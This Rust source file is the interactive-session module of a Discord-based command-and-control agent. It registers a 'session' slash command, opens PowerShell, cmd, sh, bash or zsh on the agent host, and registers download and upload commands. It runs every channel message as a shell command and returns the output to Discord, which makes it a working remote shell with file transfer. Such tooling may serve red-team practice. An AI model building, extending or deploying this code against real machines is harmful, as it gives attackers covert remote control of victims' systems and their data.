use crate::{
    commands::shell::{ download, exit, upload },
    discord_utils::bot_functions::{
        send_channel_message,
        send_code_message,
        send_edit_response,
        send_ephemeral_response,
    },
    discord_utils::channels::create_text_channel,
    errors::DiscordC2Error,
    os::process_handler::{ ProcessHandler, ShellType },
    utils::agent::get_or_create_agent,
};

use serenity::{
    builder::CreateApplicationCommand,
    client::Context,
    model::application::{
        command::{ Command, CommandOptionType },
        interaction::application_command::{
            ApplicationCommandInteraction,
            CommandDataOption,
            CommandDataOptionValue,
        },
    },
    model::prelude::Message,
};

use anyhow::Error;
use chrono::Utc;
use lazy_static::lazy_static;
use tokio::sync::Mutex;
use tracing::{ error, info as informational, warn };

lazy_static! {
    pub static ref SHELL_TYPE: Mutex<Option<ShellType>> = Mutex::new(None);
}

#[cfg(target_os = "windows")]
/// Registers the "session" application command with the provided `CreateApplicationCommand` builder. This command
/// allows users to open an interactive command session with the agent, using either PowerShell or CMD.
///
/// # Arguments
///
/// * `command` - The `CreateApplicationCommand` builder to use for registering the command.
///
/// # Returns
///
/// A mutable reference to the provided `CreateApplicationCommand` builder, with the "session" command added.
///
/// # Example
///
/// ```
/// use serenity::builder::CreateApplicationCommand;
///
/// let mut command = CreateApplicationCommand::default();
/// register(&mut command);
/// ```
///
/// This function creates an option for the "session" command, which allows users to specify the type of session
/// they want to open (either "powershell.exe" or "cmd.exe"). This option is required.
///
/// Note that this function does not actually register the command with Discord. To do that, you must call the
/// `http.create_global_application_command` method on a `Http` client object.
pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    // Register the session command
    command
        .name("session")
        .description("Open up an interactive command session with the agent.")
        .create_option(|option| {
            option
                .name("session-type")
                .kind(CommandOptionType::String)
                .description("The type of interactive session to open.")
                .add_string_choice("powershell.exe", "powershell")
                .add_string_choice("cmd.exe", "cmd")
                .required(true)
        })
}

#[cfg(target_os = "linux")]
pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    // Register the session command
    command
        .name("session")
        .description("Open up an interactive command session with the agent.")
        .create_option(|option| {
            option
                .name("session-type")
                .kind(CommandOptionType::String)
                .description("The type of interactive session to open.")
                .add_string_choice("Sh (may be symlinked to /bin/bash on some distros)", "sh")
                .add_string_choice("Bash", "bash")
                .add_string_choice("Zsh", "zsh")
                .required(true)
        })
}

/// Creates a new interactive command session with the agent, and returns a message indicating that the session
/// has been created. The session channel is created with a unique name and topic, and the "/exit" command is
/// registered within the channel to allow users to exit the session.
///
/// # Arguments
///
/// * `ctx` - The context object for the current bot session.
/// * `options` - An array of `CommandDataOption` objects containing the user's command options.
///
/// # Returns
///
/// A tuple containing a message indicating that the session has been created, and an optional `ShellType` object
/// specifying the type of shell to use for the session (if specified by the user).
///
/// # Errors
///
/// This function can return a `DiscordC2Error` if an error occurs during channel creation, command registration,
/// or shell process initialization.
///
/// # Example
///
/// ```
/// use serenity::model::interactions::{ApplicationCommandInteraction, CommandDataOption};
/// use serenity::client::Context;
///
/// async fn handle_interaction(ctx: &Context, command: ApplicationCommandInteraction, options: &[CommandDataOption]) {
///     let (content, shell) = run(ctx, options).await.expect("Failed to create session channel");
///     command.reply(&ctx.http, content).await.expect("Failed to send message");
/// }
/// ```
///
/// This function uses the `get_or_create_agent` function to retrieve the current bot agent, and creates a new
/// channel using the `create_text_channel` function. It then sets the agent's session channel attribute to the
/// new channel, and registers the "/exit" command within the channel. Finally, it initializes a shell process
/// based on the user's selected shell type (if specified).
///
/// Note that this function assumes that the `get_or_create_agent` function has already been called and the agent
/// has been initialized.
pub async fn run(
    ctx: &Context,
    options: &[CommandDataOption]
) -> Result<(String, Option<ShellType>), DiscordC2Error> {
    let mut agent = get_or_create_agent(ctx).await;

    /* Checking if the shell type/process was improperly configured */
    let mut shell_type = SHELL_TYPE.lock().await;
    if shell_type.is_some() {
        match ProcessHandler::is_instantiated().await {
            true => {
                warn!("The shell {:?} was already instantiated, what is bro doing?", shell_type);
                return Ok((
                    format!(
                        "***Command session has already been initialized in channel <#{}>!***",
                        agent.get_session_channel().unwrap()
                    ),
                    None,
                ));
            }
            false => {
                warn!("Possibly stale session?");
                *shell_type = None;
                return Ok((
                    "Hmm... Something went wrong. Possibly a stale session.".to_string(),
                    None,
                ));
            }
        }
    }

    let now = Utc::now().format("%m-%d-%Y-%H︰%M︰%S-utc").to_string(); //TODO: Cleanup this date format

    // Grab the session type from options
    let option = options
        .get(0)
        .ok_or_else(|| DiscordC2Error::DiscordError(String::from("Expected a resolved option")))?
        .resolved.as_ref()
        .ok_or_else(|| DiscordC2Error::DiscordError(String::from("Expected a resolved option")))?;

    let ctx1 = ctx.clone();
    let ctx2 = ctx.clone();
    let ctx3 = ctx.clone();

    tokio::spawn(async {
        if let Err(why) = Command::create_global_application_command(ctx1, exit::register).await {
            error!("Failed to register the exit command: {:?}", why);
            return;
        }

        informational!("Successfully registered exit command.");
    });

    tokio::spawn(async {
        if let Err(why) = Command::create_global_application_command(ctx2,download::register).await
        {
            error!("Failed to register the download command: {:?}", why);
            return;
        }

        informational!("Successfully registered download command.");
    });

    tokio::spawn(async {
        if let Err(why) = Command::create_global_application_command(ctx3, upload::register).await {
            error!("Failed to register the upload command: {:?}", why);
            return;
        }
        informational!("Successfully registered the upload-file command.");
    });

    // Create a channel for the remote session, and set the name/topic appropriately
    let session_channel = create_text_channel(
        ctx,
        &now,
        agent.get_category_channel(),
        "This is a unique and interactive command session created with your agent. Normal commands will not work here."
    ).await?;

    tokio::spawn(async move {
        if let Err(why) = agent.set_session_channel(Some(session_channel)) {
            error!("{}", why);
        }
    }); // Update the agent's session channel attribute (this also updates the JSON configuration).

    let string = format!("Successfully created command session channel at <#{}>", session_channel);

    if let CommandDataOptionValue::String(shell_type) = option {
        let (content, shell) = match shell_type.as_str() {
            "powershell" => {
                ProcessHandler::instance(&ShellType::Powershell).await?;
                (string.as_str(), ShellType::Powershell)
            }
            "cmd" => {
                ProcessHandler::instance(&ShellType::Cmd).await?;
                (string.as_str(), ShellType::Cmd)
            }
            "sh" => {
                ProcessHandler::instance(&ShellType::Sh).await?;
                (string.as_str(), ShellType::Sh)
            }
            "bash" => {
                ProcessHandler::instance(&ShellType::Bash).await?;
                (string.as_str(), ShellType::Bash)
            }
            "zsh" => {
                ProcessHandler::instance(&ShellType::Zsh).await?;
                (string.as_str(), ShellType::Zsh)
            }
            _ => {
                return Err(DiscordC2Error::InvalidShellType);
            }
        };
        Ok((content.to_string(), Option::from(shell))) //Return the success message and the shell type wrapped with an Option
    } else {
        Ok(("No options were specified.".to_string(), None)) // This will never happen as far as I know.
    }
}

/// Handles the "session" application command, which opens a new interactive command session with the agent
/// using either PowerShell or CMD. This function delegates most of its work to the `session::run` function,
/// which creates the new session and returns a message indicating that it has been created.
///
/// # Arguments
///
/// * `ctx` - The context object for the current bot session.
/// * `command` - The interaction object representing the user's "session" command.
///
/// # Returns
///
/// This function returns `Ok(())` if the session is created successfully, or a `DiscordC2Error` if an error
/// occurs during session creation.
///
/// # Example
///
/// ```
/// use serenity::model::interactions::ApplicationCommandInteraction;
/// use serenity::client::Context;
///
/// async fn handle_interaction(ctx: &Context, command: ApplicationCommandInteraction) {
///     session_handler(ctx, &command).await.expect("Failed to handle session");
/// }
/// ```
///
/// This function simply calls the `session::run` function to create the new session, and then sends the
/// resulting message back to the user using the `ephemeral_interaction_create` function. If the session is
/// created successfully, the function stores the session's `ShellType` in a global variable for later use.
///
/// Note that this function assumes that the `get_or_create_agent` function has already been called and the
/// agent has been initialized. It also assumes that the `session::run` function returns a message string
/// followed by an optional `ShellType` object.
pub async fn session_handler(
    ctx: &Context,
    command: &ApplicationCommandInteraction
) -> Result<(), DiscordC2Error> {
    let response = send_ephemeral_response(ctx, command, "Creating session....", None).await?;
    let (content, shell) = run(ctx, &command.data.options).await?;

    send_edit_response(ctx, &response, content).await?;

    if shell.is_some() {
        // Store shell_type in the global variable
        *SHELL_TYPE.lock().await = Some(shell.unwrap());
        informational!("ShellType in handle_session: {:?}", shell);
    } else {
        informational!("ShellType was null.");
    }

    Ok(())
}

pub async fn command_handler(ctx: &Context, message: &Message) -> Result<(), Error> {
    let shell_type = match SHELL_TYPE.lock().await.to_owned() {
        Some(shell_type) => shell_type,
        None => {
            // The session was closed/stale
            if !message.author.bot {
                send_channel_message(
                    ctx,
                    message.channel_id,
                    "Stale/expired session. Closing...."
                ).await?;
                exit::run(ctx).await?;
            }
            return Ok(());
        }
    };

    let shell = ProcessHandler::instance(&shell_type).await?;

    if !message.author.bot {
        if message.content == "exit" {
            shell.exit().await?;
            let mut shell_type = SHELL_TYPE.lock().await;
            *shell_type = None;
            send_channel_message(
                ctx,
                message.channel_id,
                "Successfully exited session. Use /exit to close the channel."
            ).await?;
        } else {
            let output = shell.run_command(&message.content).await?;
            let language_format = shell_type.as_str().replace(".exe", "");

            if
                let Err(why) = send_code_message(
                    ctx,
                    message.channel_id,
                    &output,
                    &language_format
                ).await
            {
                println!("{}", why);
            }
        }
    }

    Ok(())
}